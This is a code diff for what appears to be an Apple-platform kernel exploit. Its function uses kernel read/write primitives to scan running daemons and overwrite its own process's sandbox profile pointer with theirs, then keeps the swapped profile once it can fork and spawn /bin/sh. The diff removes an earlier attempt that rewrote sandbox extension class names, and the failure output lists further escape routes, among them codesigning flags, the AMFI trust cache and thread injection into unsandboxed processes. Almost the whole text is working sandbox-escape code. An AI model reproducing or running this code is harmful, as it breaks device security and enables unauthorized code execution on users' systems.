@@ -459,9 +459,10 @@ char *kresearch_dump_sandbox_profile(void) {
 
 char *kresearch_swap_sandbox_profile(void) {
     buf_init();
-    buf_append("=== SANDBOX EXEC BYPASS v7 ===\n");
-    buf_append("(v6 showed: sandbox_check BLOCKED for ALL ops including file,\n");
-    buf_append(" but file I/O works via extensions. Testing if exec also works.)\n\n");
+    buf_append("=== SANDBOX PROFILE SWAP v8 ===\n");
+    buf_append("(v7: fork+exec both EPERM. Extensions don't cover process ops.\n");
+    buf_append(" v8: Swap profile pointer to daemon profiles that allow exec.\n");
+    buf_append(" sandbox_label is WRITABLE - kwrite64 to sandbox+0x00 is safe.)\n\n");
 
     // ── Step 1: Chain walk ──
     fprintf(stderr, "[SWAP] Step 1: chain walk\n");
@@ -482,227 +483,190 @@ char *kresearch_swap_sandbox_profile(void) {
         ? kread_ptr(label + off_label_l_perpolicy_sandbox) : 0;
 
     if (!sandbox || sandbox == 0xFFFFFFFFFFFFFFFFULL || !is_kaddr_valid(sandbox)) {
-        buf_append("ERROR: sandbox chain broken (sb=0x%llx)\n", sandbox);
+        buf_append("ERROR: sandbox chain broken\n");
         return buf_finish();
     }
 
-    uint64_t ext_set = kread_ptr(sandbox + 0x10);
-    buf_append("sandbox=0x%llx ext_set=0x%llx\n\n", sandbox, ext_set);
+    uint64_t our_profile = kread64(sandbox + 0x00);
+    buf_append("sandbox=0x%llx our_profile=0x%llx\n\n", sandbox, our_profile);
 
-    // ══════════════════════════════════════════════════════════════
-    // TEST A: Try posix_spawn RIGHT NOW (before any writes)
-    // sandbox_check returns -1 for file ops too, but file I/O works
-    // because extensions bypass at MAC hook level. Maybe exec works too.
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test A: posix_spawn (no modifications)\n");
-    buf_append("-- Test A: posix_spawn (no modifications) --\n");
+    // ── Step 2: Baseline posix_spawn (confirm still blocked) ──
+    fprintf(stderr, "[SWAP] Step 2: baseline\n");
     {
         pid_t child = 0;
-        char *argv[] = {"/bin/sh", "-c", "echo spawn_ok", NULL};
+        char *argv[] = {"/bin/sh", "-c", "echo ok", NULL};
         char *envp[] = {"PATH=/usr/bin:/bin", NULL};
         int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
-        buf_append("  posix_spawn /bin/sh: ret=%d (%s)\n",
+        buf_append("Baseline posix_spawn: %d (%s)\n",
                    ret, ret == 0 ? "SUCCESS" : strerror(ret));
         if (ret == 0) {
-            buf_append("  *** SPAWN WORKED WITHOUT MODIFICATIONS! PID=%d ***\n", child);
-            int status = 0;
-            waitpid(child, &status, 0);
-            buf_append("  exit=%d\n", WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+            buf_append("*** ALREADY WORKS! PID=%d ***\n", child);
+            waitpid(child, NULL, 0);
             return buf_finish();
         }
     }
 
     // ══════════════════════════════════════════════════════════════
-    // TEST B: Try fork() directly
+    // Step 3: Collect daemon profiles to try
+    //
+    // Strategy: scan running daemons, collect unique profile pointers.
+    // Daemons like configd, runningboardd, logd need fork/exec to work.
+    // We swap our profile pointer to theirs and test fork+spawn.
+    //
+    // sandbox_label+0x00 (profile ptr) is in WRITABLE memory.
+    // Writing a valid profile pointer is safe - concurrent sandbox
+    // evaluations will use the new profile (no NULL deref risk).
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test B: fork()\n");
-    buf_append("\n-- Test B: fork() --\n");
-    {
+    fprintf(stderr, "[SWAP] Step 3: collect daemon profiles\n");
+
+    typedef struct {
+        uint64_t profile;
+        pid_t pid;
+        char name[20];
+    } daemon_profile_t;
+
+    daemon_profile_t candidates[20];
+    int n_candidates = 0;
+
+    // Scan PIDs 1-300 for sandboxed daemons with DIFFERENT profiles
+    for (pid_t scan = 1; scan <= 300 && n_candidates < 20; scan++) {
+        uint64_t p = proc_find(scan);
+        if (!p || !is_kaddr_valid(p)) continue;
+
+        uint64_t p_pro = kread_ptr(p + off_proc_p_proc_ro);
+        if (!p_pro || !is_kaddr_valid(p_pro)) continue;
+        uint64_t p_uc = kread_ptr(p_pro + off_proc_ro_p_ucred);
+        if (!p_uc || !is_kaddr_valid(p_uc)) continue;
+        uint64_t p_lab = kread_ptr(p_uc + off_ucred_cr_label);
+        if (!p_lab || !is_kaddr_valid(p_lab)) continue;
+        uint64_t p_sb = kread_ptr(p_lab + off_label_l_perpolicy_sandbox);
+
+        if (!p_sb || p_sb == 0xFFFFFFFFFFFFFFFFULL || !is_kaddr_valid(p_sb))
+            continue;
+
+        uint64_t p_prof = kread64(p_sb + 0x00);
+        if (!p_prof || !is_kaddr_valid(p_prof)) continue;
+
+        // Skip if same as our profile
+        if (p_prof == our_profile) continue;
+
+        // Skip if we already have this profile pointer
+        bool dup = false;
+        for (int i = 0; i < n_candidates; i++) {
+            if (candidates[i].profile == p_prof) { dup = true; break; }
+        }
+        if (dup) continue;
+
+        candidates[n_candidates].profile = p_prof;
+        candidates[n_candidates].pid = scan;
+        kreadbuf(p + off_proc_p_name, candidates[n_candidates].name, 19);
+        candidates[n_candidates].name[19] = '\0';
+        n_candidates++;
+    }
+
+    buf_append("Found %d unique daemon profiles (excluding ours):\n", n_candidates);
+    for (int i = 0; i < n_candidates; i++) {
+        buf_append("  [%d] PID %d %-16s prof=0x%llx\n",
+                   i, candidates[i].pid, candidates[i].name,
+                   (unsigned long long)candidates[i].profile);
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    // Step 4: Try each daemon's profile
+    //
+    // For each candidate:
+    //   1. Write daemon's profile ptr to our sandbox+0x00
+    //   2. Try fork()
+    //   3. Try posix_spawn()
+    //   4. Restore our profile ptr
+    //
+    // Window between write and restore: concurrent threads will have
+    // the daemon's profile applied. This may deny some file ops that
+    // the daemon's profile doesn't allow, but won't crash (valid ptr).
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Step 4: profile swap tests\n");
+    buf_append("\n-- Profile swap tests --\n");
+
+    bool success = false;
+    for (int i = 0; i < n_candidates && !success; i++) {
+        fprintf(stderr, "[SWAP] Trying %s (PID %d)\n",
+                candidates[i].name, candidates[i].pid);
+        buf_append("\n  [%d] %s (PID %d) prof=0x%llx\n",
+                   i, candidates[i].name, candidates[i].pid,
+                   (unsigned long long)candidates[i].profile);
+
+        // Write daemon's profile pointer to our sandbox_label
+        kwrite64(sandbox + 0x00, candidates[i].profile);
+
+        // Verify write
+        uint64_t rb = kread64(sandbox + 0x00);
+        buf_append("  Profile swapped. Readback=0x%llx %s\n",
+                   rb, (rb == candidates[i].profile) ? "OK" : "MISMATCH");
+
+        if (rb != candidates[i].profile) {
+            buf_append("  WRITE FAILED - sandbox+0x00 may be protected!\n");
+            // Restore immediately and stop trying
+            kwrite64(sandbox + 0x00, our_profile);
+            buf_append("  *** sandbox_label+0x00 NOT writable. Cannot swap. ***\n");
+            break;
+        }
+
+        // Test fork
+        int fork_ok = 0;
         pid_t fpid = fork();
         if (fpid == 0) {
-            _exit(42);  // child exits immediately
+            _exit(42);
         } else if (fpid > 0) {
-            buf_append("  fork() SUCCEEDED! child PID=%d\n", fpid);
+            fork_ok = 1;
             int status = 0;
             waitpid(fpid, &status, 0);
-            buf_append("  child exit=%d\n", WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+            buf_append("  fork: OK (child=%d exit=%d)\n", fpid,
+                       WIFEXITED(status) ? WEXITSTATUS(status) : -1);
         } else {
-            buf_append("  fork() FAILED: %d (%s)\n", errno, strerror(errno));
+            buf_append("  fork: FAILED (%d %s)\n", errno, strerror(errno));
         }
-    }
 
-    // ══════════════════════════════════════════════════════════════
-    // TEST C: Try posix_spawn with POSIX_SPAWN_SETEXEC (exec in-process)
-    // and also try /usr/bin/env as alternative binary
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test C: alternative binaries\n");
-    buf_append("\n-- Test C: alternative exec targets --\n");
-    {
-        const char *bins[] = {"/usr/bin/env", "/usr/bin/id", "/bin/ls", NULL};
-        for (int i = 0; bins[i]; i++) {
+        // Test posix_spawn
+        {
             pid_t child = 0;
-            char *argv[] = {(char *)bins[i], NULL};
+            char *argv[] = {"/bin/sh", "-c", "echo spawn_ok && id", NULL};
             char *envp[] = {"PATH=/usr/bin:/bin", NULL};
-            int ret = posix_spawn(&child, bins[i], NULL, NULL, argv, envp);
-            buf_append("  posix_spawn %s: ret=%d (%s)",
-                       bins[i], ret, ret == 0 ? "SUCCESS" : strerror(ret));
+            int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
             if (ret == 0) {
-                buf_append(" PID=%d", child);
+                buf_append("  posix_spawn: SUCCESS! PID=%d\n", child);
                 int status = 0;
                 waitpid(child, &status, 0);
-                buf_append(" exit=%d", WIFEXITED(status) ? WEXITSTATUS(status) : -1);
-            }
-            buf_append("\n");
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════
-    // TEST D: Extension class swap experiment
-    //
-    // We know from v6 that buckets [1]-[8] have writable extension data
-    // (sandbox_escape.m already wrote there successfully).
-    // Try changing bucket[6]'s class name (it uses a DIFFERENT node
-    // from buckets 1-5,7-8) to exec-related class names.
-    //
-    // Using kwritebuf which internally calls early_kwrite32bytes -
-    // the same proven-safe primitive sandbox_escape.m used.
-    // ══════════════════════════════════════════════════════════════
-    if (ext_set && is_kaddr_valid(ext_set)) {
-        fprintf(stderr, "[SWAP] Test D: extension class swap\n");
-        buf_append("\n-- Test D: Extension class swap --\n");
-
-        // Use bucket[6] - it has its own distinct node (0xffffffe6e49e9f20)
-        // so changing it won't affect the shared node in other buckets
-        uint64_t target_node = kread_ptr(ext_set + (6 * 8));
-        if (!target_node || !is_kaddr_valid(target_node)) {
-            buf_append("  Bucket[6] invalid, trying bucket[1]\n");
-            target_node = kread_ptr(ext_set + (1 * 8));
-        }
-
-        if (target_node && is_kaddr_valid(target_node)) {
-            uint64_t cls_ptr = kread_ptr(target_node + 0x10);
-
-            // Save original class name
-            char orig_cls[64] = {0};
-            if (cls_ptr && is_kaddr_valid(cls_ptr))
-                kreadbuf(cls_ptr, orig_cls, 63);
-            buf_append("  Target node=0x%llx class_ptr=0x%llx\n", target_node, cls_ptr);
-            buf_append("  Original class: \"%s\"\n", orig_cls);
-
-            if (cls_ptr && is_kaddr_valid(cls_ptr)) {
-                // Try each exec-related extension class name
-                // Using kwritebuf (calls early_kwrite32bytes internally)
-                const char *exec_classes[] = {
-                    "com.apple.sandbox.executable",
-                    "process-exec",
-                    "com.apple.sandbox.process-exec",
-                    "com.apple.app-sandbox.execute",
-                    NULL
-                };
-
-                bool exec_unlocked = false;
-                for (int c = 0; exec_classes[c] && !exec_unlocked; c++) {
-                    fprintf(stderr, "[SWAP] D: trying \"%s\"\n", exec_classes[c]);
-                    buf_append("\n  Trying: \"%s\"\n", exec_classes[c]);
-
-                    // Write new class name (kwritebuf = early_kwrite32bytes)
-                    uint8_t cls_buf[32];
-                    memset(cls_buf, 0, 32);
-                    size_t len = strlen(exec_classes[c]);
-                    if (len > 31) len = 31;
-                    memcpy(cls_buf, exec_classes[c], len);
-                    kwritebuf(cls_ptr, cls_buf, 32);
-
-                    // Verify write
-                    char rb[64] = {0};
-                    kreadbuf(cls_ptr, rb, 63);
-                    buf_append("  Readback: \"%s\"\n", rb);
-
-                    // Try posix_spawn
-                    pid_t child = 0;
-                    char *argv[] = {"/bin/sh", "-c", "echo spawn_ok", NULL};
-                    char *envp[] = {"PATH=/usr/bin:/bin", NULL};
-                    int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
-                    buf_append("  posix_spawn: %d (%s)\n",
-                               ret, ret == 0 ? "SUCCESS" : strerror(ret));
-                    if (ret == 0) {
-                        buf_append("  *** EXEC UNLOCKED with \"%s\"! PID=%d ***\n",
-                                   exec_classes[c], child);
-                        int status = 0;
-                        waitpid(child, &status, 0);
-                        buf_append("  exit=%d\n",
-                                   WIFEXITED(status) ? WEXITSTATUS(status) : -1);
-                        exec_unlocked = true;
-                    }
-                }
-
-                // Restore original class name if nothing worked
-                if (!exec_unlocked) {
-                    uint8_t restore[32];
-                    memset(restore, 0, 32);
-                    size_t rlen = strlen(orig_cls);
-                    if (rlen > 31) rlen = 31;
-                    memcpy(restore, orig_cls, rlen);
-                    kwritebuf(cls_ptr, restore, 32);
-                    buf_append("\n  None worked. Class restored.\n");
-                }
+                buf_append("  exit=%d\n",
+                           WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+                buf_append("\n  *** EXEC UNLOCKED with %s profile! ***\n",
+                           candidates[i].name);
+                success = true;
+                // DON'T restore - keep the working profile!
+            } else {
+                buf_append("  posix_spawn: %d (%s)\n", ret, strerror(ret));
             }
         }
-    }
 
-    // ══════════════════════════════════════════════════════════════
-    // TEST E: Profile pointer swap
-    //
-    // sandbox_label is in WRITABLE memory (not PPL).
-    // Try pointing profile to 0 with a safety guard:
-    // We do the write, immediately try posix_spawn, then restore.
-    // The window is <1ms. Risk: concurrent sandbox_check on another
-    // thread could deref NULL. But we have no safe alternative.
-    //
-    // Actually, safer: find another process's sandbox profile pointer
-    // and copy it. Let's try to find a permissive daemon.
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test E: scan for permissive daemons\n");
-    buf_append("\n-- Test E: Scan for daemons with exec-permissive sandbox --\n");
-    {
-        // Scan PIDs 1-200 looking for processes with real sandbox_labels
-        // that might have more permissive profiles
-        int found = 0;
-        for (pid_t scan_pid = 1; scan_pid <= 200 && found < 10; scan_pid++) {
-            uint64_t p = proc_find(scan_pid);
-            if (!p || !is_kaddr_valid(p)) continue;
-
-            uint64_t p_pro = kread_ptr(p + off_proc_p_proc_ro);
-            if (!p_pro || !is_kaddr_valid(p_pro)) continue;
-            uint64_t p_uc = kread_ptr(p_pro + off_proc_ro_p_ucred);
-            if (!p_uc || !is_kaddr_valid(p_uc)) continue;
-            uint64_t p_lab = kread_ptr(p_uc + off_ucred_cr_label);
-            if (!p_lab || !is_kaddr_valid(p_lab)) continue;
-            uint64_t p_sb = kread_ptr(p_lab + off_label_l_perpolicy_sandbox);
-
-            // Skip sentinel (unsandboxed) and invalid
-            if (!p_sb || p_sb == 0xFFFFFFFFFFFFFFFFULL || !is_kaddr_valid(p_sb))
-                continue;
-
-            uint64_t p_prof = kread_ptr(p_sb + 0x00);
-            uint32_t p_pf = kread32(p + off_proc_p_flag);
-            char pname[20] = {0};
-            kreadbuf(p + off_proc_p_name, pname, 19);
-
-            // Check if this process can exec (sandbox_check from our PID won't work,
-            // but we can compare profile pointers)
-            buf_append("  PID %3d %-16s sb=0x%llx prof=0x%llx pf=0x%08x\n",
-                       scan_pid, pname, p_sb, p_prof, p_pf);
-            found++;
+        // Restore if this candidate didn't work
+        if (!success) {
+            kwrite64(sandbox + 0x00, our_profile);
+            // Verify restore
+            uint64_t restore_rb = kread64(sandbox + 0x00);
+            buf_append("  Restored (rb=0x%llx)\n",
+                       (unsigned long long)restore_rb);
         }
-        if (found == 0) buf_append("  No sandboxed daemons found in PID 1-200\n");
     }
 
-    buf_append("\n-- Summary --\n");
-    buf_append("If Tests A-C all returned EPERM (1), exec is blocked by\n");
-    buf_append("something beyond sandbox extensions (likely AMFI/TXM).\n");
-    buf_append("If fork() worked but exec didn't, only exec path is blocked.\n");
-    buf_append("Daemon profiles above can be swapped in for targeted testing.\n");
+    if (!success) {
+        buf_append("\n-- All profile swaps failed --\n");
+        buf_append("fork+exec blocked even with daemon profiles.\n");
+        buf_append("Block is ABOVE sandbox layer (AMFI/TXM/codesigning).\n");
+        buf_append("\nNext vectors to investigate:\n");
+        buf_append("  1. cs_flags in csblob (CS_PLATFORM_BINARY etc)\n");
+        buf_append("  2. AMFI trust cache entries\n");
+        buf_append("  3. proc_ro->p_csflags if writable via zone element\n");
+        buf_append("  4. task_for_pid + thread injection into unsandboxed proc\n");
+    }
 
     return buf_finish();
 }
